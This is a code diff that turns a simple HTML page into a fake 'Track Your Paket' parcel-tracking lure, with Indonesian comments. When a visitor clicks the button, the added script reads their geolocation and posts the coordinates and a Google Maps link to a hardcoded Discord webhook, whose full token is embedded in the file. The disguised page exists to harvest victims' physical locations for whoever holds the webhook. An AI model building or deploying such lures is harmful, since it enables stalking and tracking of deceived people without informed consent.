@@ -1,27 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Paket</title>
+<title>Track Your Paket</title>
 </head>
 <body>
 
 <h2>Track Your Packet</h2>
-<button onclick="getLocation()">GOO!!</button>
+<button onclick="getLocation()">GOO!!!</button>
 
 <script>
 function getLocation() {
+  // URL Webhook Discord kamu sudah dimasukkan di sini
+  const webhookUrl = "https://discord.com/api/webhooks/1479567433978085578/hBEF7bgrobfgKhNtZxaQoI-F1BSRLq-mekgbyAnOscvV-5Dw_wFd50HcE4jEtBMg9see"; 
+
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(position) {
-      alert("Latitude: " + position.coords.latitude +
-      " Longitude: " + position.coords.longitude);
-    });
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        
+        // Pesan yang akan muncul di channel Discord
+        // Link Google Maps sudah diperbaiki agar bisa langsung diklik
+        const pesanDiscord = `📦 **Seseorang Mengklik Tombol Track!**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Cek di Maps:** https://www.google.com/maps?q=${lat},${lon}`;
+
+        // Mengirim data ke Discord
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: pesanDiscord
+          })
+        })
+        .then(response => {
+          if (response.ok) {
+            // Notifikasi di browser kalau berhasil
+            alert("Lokasi berhasil dikirim untuk di-track!"); 
+          } else {
+            alert("Gagal mengirim data ke server.");
+          }
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          alert("Terjadi kesalahan jaringan.");
+        });
+      },
+      function(error) {
+        // Jika user menolak izin lokasi atau ada error lain
+        alert("Gagal mendapatkan lokasi: " + error.message);
+      }
+    );
   } else {
-    alert("Geolocation not supported");
+    alert("Geolocation tidak didukung oleh browser ini.");
   }
 }
 </script>
 
 </body>
 </html>
-
-
